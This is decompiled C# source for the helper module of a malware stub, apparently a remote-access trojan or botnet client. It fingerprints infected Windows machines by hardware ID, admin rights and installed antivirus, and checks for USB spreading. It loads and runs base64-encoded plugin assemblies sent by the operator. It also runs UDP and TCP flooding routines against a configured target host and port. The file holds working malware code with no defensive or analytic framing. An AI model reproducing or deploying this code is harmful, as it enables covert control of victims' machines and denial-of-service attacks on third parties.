using System;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub;

[StandardModule]
internal sealed class Helper
{
	public static byte[] SB(string s)
	{
		return Encoding.Default.GetBytes(s);
	}

	public static string BS(byte[] b)
	{
		return Encoding.Default.GetString(b);
	}

	public static string ID()
	{
		try
		{
			return GetHashT(string.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion, new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Err HWID";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string GetHashT(string strToHash)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(strToHash);
		bytes = mD5CryptoServiceProvider.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = bytes;
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("x2"));
		}
		return stringBuilder.ToString().Substring(0, 20).ToUpper();
	}

	public static object frombase64(string bs64)
	{
		object result = default(object);
		try
		{
			result = Convert.FromBase64String(bs64);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object objj(string byt)
	{
		return RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin((byte[])frombase64(byt), "Class1")));
	}

	public static object Plugin(byte[] b, string c)
	{
		Module[] modules = Assembly.Load(b).GetModules();
		foreach (Module module in modules)
		{
			Type[] types = module.GetTypes();
			foreach (Type type in types)
			{
				if (type.FullName!.EndsWith("." + c))
				{
					return module.Assembly.CreateInstance(type.FullName);
				}
			}
		}
		return null;
	}

	public static byte[] AES_Encryptor(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(SB(Settings.KEY));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			GC.Collect();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static byte[] AES_Decryptor(byte[] input)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			rijndaelManaged.Key = mD5CryptoServiceProvider.ComputeHash(SB(Settings.KEY));
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			GC.Collect();
			result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string INDATE()
	{
		try
		{
			FileInfo fileInfo = new FileInfo(Settings.path2);
			return fileInfo.LastWriteTime.ToString("dd/MM/yyy");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string usbp()
	{
		try
		{
			if (Operators.CompareString(Path.GetFileName(Settings.path2), Settings.nameee, false) == 0)
			{
				return "True";
			}
			return "False";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string admin()
	{
		try
		{
			object current = WindowsIdentity.GetCurrent();
			object obj = new WindowsPrincipal((WindowsIdentity)current);
			if (Conversions.ToBoolean(NewLateBinding.LateGet(obj, (Type)null, "IsInRole", new object[1] { WindowsBuiltInRole.Administrator }, (string[])null, (Type[])null, (bool[])null)))
			{
				return "True";
			}
			return "False";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string Antivirus()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
				try
				{
					enumerator = val.Get().GetEnumerator();
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						stringBuilder.Append(current.get_Item("displayName").ToString());
						stringBuilder.Append(",");
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (stringBuilder.ToString().Length == 0)
				{
					return "None";
				}
				return stringBuilder.ToString().Substring(0, checked(stringBuilder.Length - 1));
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "None";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool CreateMutex()
	{
		Settings._appMutex = new Mutex(initiallyOwned: false, Settings.Mutexx, out var createdNew);
		return createdNew;
	}

	public static void CloseMutex()
	{
		if (Settings._appMutex != null)
		{
			Settings._appMutex.Close();
			Settings._appMutex = null;
		}
	}

	public static void tickees(object sender, ElapsedEventArgs e)
	{
		checked
		{
			try
			{
				if (Operators.CompareString(Settings.dostype, "UDP", false) == 0)
				{
					while (true)
					{
						UdpClient udpClient = new UdpClient();
						try
						{
							Random random = new Random();
							byte[] array = new byte[65500];
							int num = 0;
							do
							{
								array[num] = (byte)random.Next(0, 255);
								num++;
							}
							while (num <= 65499);
							IPAddress addr = IPAddress.Parse(Settings.doshost);
							udpClient.Connect(addr, Conversions.ToInteger(Settings.dosport));
							udpClient.Send(array, array.Length);
							udpClient.Close();
							GC.Collect();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							udpClient.Close();
							GC.Collect();
							ProjectData.ClearProjectError();
							continue;
						}
						break;
					}
				}
				if (Operators.CompareString(Settings.dostype, "TCP", false) != 0)
				{
					return;
				}
				while (true)
				{
					try
					{
						IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(Settings.doshost), Convert.ToInt32(Settings.dosport));
						Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
						socket.Connect(remoteEP);
						socket.Close();
						GC.Collect();
						break;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}
}
